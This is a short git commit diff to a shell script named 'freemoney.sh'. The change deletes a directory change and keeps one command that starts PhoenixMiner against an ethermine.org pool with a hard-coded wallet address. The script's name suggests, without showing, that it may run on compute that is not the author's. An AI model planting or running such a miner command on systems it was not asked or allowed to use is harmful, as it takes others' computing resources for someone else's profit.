a8c4bd384e09e64662c0c2da07dd083fa6bb03b2
arjwoo <142012210+arjwoo@users.noreply.github.com>
2023-08-13 00:37:57 +0530

    Update freemoney.sh

--- METH/freemoney.sh
+++ METH/freemoney.sh
@@ -1,2 +1,1 @@
-cd PhoenixMiner_6.2c_Linux
 ./PhoenixMiner -pool ssl://eu1.ethermine.org:5555 -wal 44M329bgYRs1Dn2cY2rZicPfyPaGZD2QLCATkrcWcKyre17tzLVykAicbMfBVqviNnGfLmyU3pjrKG2VGzFRhNE7JHWcAM8.rig1
